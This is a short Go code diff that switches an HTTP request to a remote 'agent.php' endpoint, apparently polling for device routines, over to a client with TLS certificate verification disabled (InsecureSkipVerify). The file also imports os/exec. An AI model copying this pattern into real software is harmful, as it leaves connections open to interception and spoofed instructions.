@@ -6,11 +6,18 @@ import (
 	"log"
 	"net/http"
 	"os/exec"
+	"crypto/tls"
 )
 
 func main() {
 	
-	res, err := http.Get("https://li804-102.members.linode.com/fgtcfg/lib/agent.php?action=device/routine/get&devId=123")
+
+	tr := &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+    }
+    client := &http.Client{Transport: tr}
+    
+	res, err := client.Get("https://li804-102.members.linode.com/fgtcfg/lib/agent.php?action=device/routine/get&devId=123")
 	if err != nil {
 		log.Fatal(err)
 	}
